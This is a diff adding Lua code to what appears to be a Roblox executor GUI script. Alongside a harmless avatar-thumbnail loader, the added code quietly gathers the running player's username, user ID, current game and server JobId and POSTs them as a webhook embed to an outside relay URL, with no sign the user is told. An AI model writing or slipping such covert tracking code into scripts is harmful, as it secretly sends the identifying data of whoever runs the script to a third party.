@@ -141,3 +141,68 @@ smeweirdtext.TextScaled = true
 smeweirdtext.TextSize = 14.000
 smeweirdtext.TextWrapped = true
 smeweirdtext.TextXAlignment = Enum.TextXAlignment.Left
+
+
+					local function HMJCESE_fake_script()
+						local Players = game:GetService("Players")
+
+						local thumbType = Enum.ThumbnailType.HeadShot
+						local thumbSize = Enum.ThumbnailSize.Size180x180
+						local content, isReady = Players:GetUserThumbnailAsync(LocalP.UserId, thumbType, thumbSize)
+
+
+						local imageLabel = script.Parent
+						imageuser.Image = content
+					end
+					coroutine.wrap(HMJCESE_fake_script)()
+
+        local url =
+        "https://websec.services/send/62e806ed7907ab0a63d4d550"
+    
+
+        local data = {
+            ["embeds"] = {
+                {
+                    ["title"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                    ["url"] = "https://www.roblox.com/games/2788229376/Da-Hood",
+                    ["type"] = "rich",
+                    ["fields"] = {
+                        {
+                            ["name"] = '**ROBLOX Name**',
+                            ["value"] = "```" .. game:GetService("Players").LocalPlayer.Name .. "```",
+                            ["inline"] = false,
+
+
+                        },
+                        {
+
+                            ["name"] = '**ROBLOX User ID**',
+                            ["value"] = "```" .. game:GetService("Players").LocalPlayer.UserId .. "```",
+                            ["inline"] = false
+
+                        },
+                        {
+                            ["name"] = '**Game Playing**',
+                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
+                            ["inline"] = false
+
+                        },
+                        {
+                            ["name"] = '**Server ID**',
+                            ["value"] = "```" .. game.JobId .. "```",
+                            ["inline"] = false
+
+                        }
+                    }
+
+                } }
+        }
+
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+        local headers = {
+            ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = { Url = url, Body = newdata, Method = "POST", Headers = headers }
+        request(abcdef)
